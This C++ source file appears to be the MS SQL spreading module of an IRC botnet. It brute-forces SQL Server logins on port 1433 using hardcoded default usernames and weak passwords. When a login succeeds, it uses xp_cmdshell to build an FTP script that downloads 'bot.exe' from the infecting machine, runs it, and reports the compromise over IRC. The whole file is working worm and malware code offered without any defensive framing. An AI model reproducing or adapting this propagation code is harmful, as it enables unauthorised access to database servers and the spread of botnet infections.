#include "main.h"
#include "mainctrl.h"
#include "utility.h"
#ifdef WIN32
#include <sql.h>
#include <sqlext.h>

class CScannerSQL :
	public CScannerBase
{

public:
	CScannerSQL(void);
	virtual ~CScannerSQL()
	throw()
	{
	}
	bool	Exploit(void);
protected:
	bool Infect(const char *ip, const char *username, const char *password);
};

char *name[] = {"sa", "root", "admin", NULL};
char *pass[] = {"pass", "password", "sa", "root", "admin", 
				"1", "12", "123", "1234", "12345", "123456", 
				"database", "server", "sql", "system", "box",
				"temp", "test", "pw", "secret", "penis", NULL};

#define SQL_DEFAULT_PORT	1433

CScannerSQL::CScannerSQL(void)
{
	m_szType = "CScannerSQL";
	m_sScannerName.Assign("SQL");
}

bool CScannerSQL::Exploit(void)
{
	int name_index = 0, pass_index = 0;
	HKEY hReg;

	if(!m_sSocket.Connect(m_sSocket.m_szHost, SQL_DEFAULT_PORT))	/* Connect failed, exit */
	{
		return false;
	}
	m_sSocket.Disconnect();

	if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\MSSQLServer\\Client\\ConnectTo", 0, KEY_ALL_ACCESS, &hReg) == ERROR_SUCCESS) {
		DWORD so_data = strlen("DBMSSOCN") + 1;
		RegSetValueEx(hReg, "DSQUERY",0, REG_SZ , (unsigned char *)"DBMSSOCN", so_data);
	}

	while (name[name_index]) {
		if (Infect(m_sSocket.m_szHost, name[name_index], "")) return true; 
		while (pass[pass_index]) {
			if (Infect(m_sSocket.m_szHost, name[name_index], pass[pass_index])) return true; 
			pass_index++;
		}
		name_index++;
	}
	return false;
}

bool CScannerSQL::Infect(const char *ip, const char *username, const char *password)
{
	SQLHENV henv = SQL_NULL_HENV;
	SQLHDBC hdbc1 = SQL_NULL_HDBC;     
	SQLHSTMT hstmt1 = SQL_NULL_HSTMT;
	RETCODE retcode;
	SQLCHAR szName[512], szOutConn[1024] ;
	SQLINTEGER cbName;
	SQLSMALLINT szint;
	char constr[1024], command[2048];

	sprintf(constr, "%s%s%s%d%s%s%s%s", "DRIVER={SQL Server};SERVER=", ip, ",", 1433, ";UID=", username,";PWD=", password);
	SQLAllocHandle (SQL_HANDLE_ENV, NULL, &henv);
	SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER) SQL_OV_ODBC3, SQL_IS_INTEGER);
	SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc1);
	retcode = SQLDriverConnect(hdbc1, NULL, (SQLTCHAR*)constr, SQL_NTS, szOutConn, 1024, &szint, SQL_DRIVER_NOPROMPT);
	if (retcode != SQL_ERROR) {
		sprintf(command,
				"xp_cmdshell 'echo open %s %d > bla.txt'\n"
				"xp_cmdshell 'echo user blah blah >> bla.txt'\n"
				"xp_cmdshell 'echo binary >> bla.txt'\n"
				"xp_cmdshell 'echo get %s >> bla.txt'\n"
				"xp_cmdshell 'echo quit >> bla.txt'\n"
				"xp_cmdshell 'ftp.exe -n -s:bla.txt'\n"
				"xp_cmdshell '%s\n'", 
				g_pMainCtrl->m_cIRC.m_sLocalIp.CStr(), g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue, "bot.exe", "bot.exe");
		SQLAllocHandle(SQL_HANDLE_STMT, hdbc1, &hstmt1);
		SQLExecDirect(hstmt1, (SQLTCHAR*)&command, SQL_NTS);
		SQLFreeHandle(SQL_HANDLE_STMT, hstmt1);
		if (g_pMainCtrl->m_cBot.scaninfo_level.iValue >= 2)
		{
			SendLocal("%s: exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
		}			
		SQLDisconnect(hdbc1);
		SQLFreeHandle(SQL_HANDLE_DBC, hdbc1);
		SQLFreeHandle(SQL_HANDLE_ENV, henv);
		return true;
	}
	SQLDisconnect(hdbc1);
	SQLFreeHandle(SQL_HANDLE_DBC, hdbc1);
	SQLFreeHandle(SQL_HANDLE_ENV, henv);
	return false;
}

REGSCANNER(SQL_1433, SQL, 1433, true, true)
#endif
